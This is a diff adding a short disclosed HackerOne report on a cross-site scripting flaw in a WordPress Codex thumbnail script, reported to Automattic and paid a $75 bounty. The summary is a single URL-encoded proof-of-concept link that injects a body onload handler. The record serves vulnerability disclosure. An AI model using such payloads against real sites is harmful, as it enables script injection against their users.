@@ -1,0 +1,14 @@
+ReportLink:https://hackerone.com/reports/104559
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/spam404
+ReportedTo:Automattic(automattic)
+BountyAmount:75.0
+Severity:
+State:Closed
+DateOfDisclosure:19.06.2016 9:05:49
+
+Summary:
+
+Proof-of-concept here - 
+
+http://codex.wordpress.org/thumb.php?f=xss%23%3Cbody%09onload=confirm%28String.fromCharCode%2888,83,83%29%29%3E
